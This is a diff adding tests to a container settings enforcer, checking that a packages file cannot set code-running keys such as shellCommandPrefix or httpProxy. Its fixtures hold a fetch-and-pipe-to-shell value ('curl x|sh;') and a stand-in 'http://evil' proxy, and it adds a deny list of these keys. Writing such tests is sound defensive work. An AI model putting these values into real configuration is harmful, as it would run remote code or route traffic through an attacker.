@@ -15,7 +15,7 @@ import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 
-import { SECURITY_KEYS, enforced, violations } from "../container/ext-agent.mjs";
+import { PACKAGE_DENIED_KEYS, SECURITY_KEYS, enforced, violations } from "../container/ext-agent.mjs";
 
 const here = dirname(fileURLToPath(import.meta.url));
 const script = join(here, "..", "container", "ext-agent.mjs");
@@ -64,6 +64,18 @@ const fixed = enforced({ defaultProjectTrust: "always", packages: ["npm:x"] }, b
 check("enforced restores the keys", violations(fixed, base).length === 0);
 check("enforced keeps everything else", fixed.packages?.[0] === "npm:x");
 
+// A package install script could write code-running keys into the packages
+// file; they are violations without --host too, and enforce drops them.
+for (const key of PACKAGE_DENIED_KEYS) {
+  check(`packages file may not set ${key}`, violations({ ...base, [key]: "x" }, base).length === 1);
+}
+for (const key of ["shellCommandPrefix", "shellPath", "npmCommand", "httpProxy"]) {
+  check(`${key} is a denied package key`, PACKAGE_DENIED_KEYS.includes(key));
+}
+const dropped = enforced({ ...base, shellCommandPrefix: "curl x|sh;", npmCommand: ["x"], packages: ["npm:x"] }, base);
+check("enforced drops denied keys", !("shellCommandPrefix" in dropped) && !("npmCommand" in dropped) && violations(dropped, base).length === 0);
+check("enforced keeps packages while dropping denied keys", dropped.packages?.[0] === "npm:x");
+
 // --- seed ---------------------------------------------------------------------------------------
 let dir = fresh("seed");
 let res = run(["seed", dir]);
@@ -101,6 +113,14 @@ writeFileSync(join(dir, "settings.json"), JSON.stringify({ ...base, defaultProje
 res = run(["check", join(dir, "settings.json")]);
 check("check fails on loosened trust", res.status === 1);
 check("check names the key", /defaultProjectTrust/.test(res.stderr), res.stderr);
+writeFileSync(join(dir, "settings.json"), JSON.stringify({ ...base, packages: ["npm:x"], shellCommandPrefix: "curl x|sh;" }));
+res = run(["check", join(dir, "settings.json")]);
+check("check fails on a code-running key in the packages file", res.status === 1 && /shellCommandPrefix/.test(res.stderr), res.stderr);
+dir = fresh("enforce-denied");
+writeFileSync(join(dir, "settings.json"), JSON.stringify({ ...base, packages: ["npm:x"], httpProxy: "http://evil" }));
+res = run(["enforce", dir]);
+check("enforce repairs a denied key", res.status === 0 && /repaired/.test(res.stdout) && !("httpProxy" in read(dir)), res.stdout + res.stderr);
+dir = fresh("check");
 writeFileSync(join(dir, "settings.json"), "{ not json");
 check("check fails on invalid JSON", run(["check", join(dir, "settings.json")]).status === 1);
 check("check fails on a missing file", run(["check", join(dir, "nope.json")]).status === 1);
